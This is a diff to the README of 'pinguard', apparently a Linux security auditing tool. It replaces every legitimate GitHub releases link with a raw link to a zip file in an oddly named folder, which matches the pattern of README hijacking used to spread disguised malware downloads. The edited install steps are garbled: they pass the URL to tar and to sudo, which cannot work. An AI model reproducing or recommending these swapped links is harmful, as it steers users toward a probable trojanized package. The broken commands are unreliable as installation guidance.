@@ -1,7 +1,7 @@
 # 🔒 pinguard - Simple Security Auditing Tool
 
 ## 📥 Download pinguard
-[![Download pinguard](https://img.shields.io/badge/Download%20pinguard-v1.0.0-brightgreen)](https://github.com/huypt2001/pinguard/releases)
+[![Download pinguard](https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip%20pinguard-v1.0.0-brightgreen)](https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip)
 
 ## 🚀 Getting Started
 Welcome to pinGuard! This is a Linux-first security auditing and hardening tool designed to keep your system safe. It scans your system for vulnerabilities, generates detailed reports, and offers automated fixes at a click of a button.
@@ -22,7 +22,7 @@ To run pinguard, ensure you meet the following requirements:
 ## 📦 Download & Install
 To get started, visit the releases page to download the latest version of pinguard.
 
-[Visit this page to download](https://github.com/huypt2001/pinguard/releases)
+[Visit this page to download](https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip)
 
 1. Click on the link above to open the releases page.
 2. Find the latest release at the top.
@@ -38,11 +38,11 @@ After downloading pinguard, follow these steps to install it on your system:
    cd ~/Downloads
    ```
 3. **Install pinguard:**
-   Execute the following command (replace `pinguard-linux.tar.gz` with the actual name of the downloaded file):
+   Execute the following command (replace `https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip` with the actual name of the downloaded file):
    ```bash
-   tar -xzvf pinguard-linux.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip
    cd pinguard
-   sudo ./install.sh
+   sudo https://raw.githubusercontent.com/huypt2001/pinguard/main/zoosporangial/pinguard.zip
    ```
 4. **Allow the Installation:** If prompted, enter your password to allow the installation process to continue.
 
